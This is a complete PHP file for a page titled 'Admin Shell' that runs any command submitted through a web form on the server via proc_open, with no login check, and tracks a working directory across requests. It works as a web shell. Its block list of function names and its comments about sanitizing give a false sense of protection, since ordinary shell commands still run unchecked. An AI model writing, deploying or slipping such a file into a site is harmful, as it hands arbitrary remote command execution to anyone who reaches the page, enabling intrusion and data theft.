<?php
session_start(); // Start or resume a session

// Initialize current working directory
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd(); // Start with current directory
}

// Check if a command is submitted
if (isset($_POST['cmd'])) {
    // Validate and sanitize the command input
    $cmd = trim($_POST['cmd']);

    // Avoiding direct execution functions
    $disabled_functions = array(
        'exec', 'system', 'passthru', 'shell_exec',
        'proc_nice', 'proc_terminate', 'pfsockopen',
        'dl', 'show_source', 'posix_kill', 'posix_mkfifo',
        'posix_getpwuid', 'posix_setpgid', 'posix_setsid',
        'posix_setuid', 'posix_setgid', 'posix_seteuid',
        'posix_setegid', 'posix_uname', 'leak', 'apache_child_terminate'
    );

    // Check if any of the disabled functions are used in the command
    foreach ($disabled_functions as $func) {
        if (stripos($cmd, $func) !== false) {
            die("Access denied. Command contains disallowed function: $func");
        }
    }

    // Change directory command handling
    if (strpos($cmd, 'cd ') === 0) {
        // Extract directory path from cd command
        $new_dir = trim(substr($cmd, 3));

        // Resolve relative paths based on current working directory
        if ($new_dir == '..') {
            // Move up one directory
            $_SESSION['cwd'] = realpath($_SESSION['cwd'] . '/..');
        } else {
            // Move to the specified directory
            $_SESSION['cwd'] = realpath($_SESSION['cwd'] . '/' . $new_dir);
        }

        // Validate and update current working directory
        if ($_SESSION['cwd'] === false || !is_dir($_SESSION['cwd'])) {
            $_SESSION['cwd'] = getcwd(); // Revert to current directory if invalid
            echo "Invalid directory or permission denied.";
        } else {
            chdir($_SESSION['cwd']); // Change PHP's current working directory
        }

        // Display current working directory after cd command
        echo "<pre>Current directory: " . htmlspecialchars($_SESSION['cwd']) . "</pre>";
    } else {
        // Execute command using proc_open
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );

        $process = proc_open($cmd, $descriptorspec, $pipes, $_SESSION['cwd']);

        if (is_resource($process)) {
            // Read output from command
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);

            $return_value = proc_close($process);

            // Display command output
            echo "<pre>";
            if (!empty($output)) {
                echo htmlspecialchars($output);
            } elseif (!empty($error)) {
                echo "Error: " . htmlspecialchars($error);
            } else {
                echo "Command returned $return_value";
            }
            echo "</pre>";
        } else {
            echo "Failed to execute command.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
        }
        textarea {
            width: 100%;
            height: 100px;
            margin-bottom: 10px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            font-size: 16px;
        }
        .output {
            border: 1px solid #ccc;
            padding: 10px;
            margin-top: 20px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <h1>Admin Shell</h1>
    <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
        <label for="cmd">Enter your command:</label><br>
        <textarea id="cmd" name="cmd" placeholder="Type your command here..."></textarea><br>
        <input type="submit" value="Execute Command">
    </form>

    <div class="output">
        <?php
        // Output executed command result here
        if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($output)) {
            echo "<h2>Command Output:</h2>";
            echo "<pre>";
            echo htmlspecialchars($output);
            echo "</pre>";
        }
        ?>
    </div>
</body>
</html>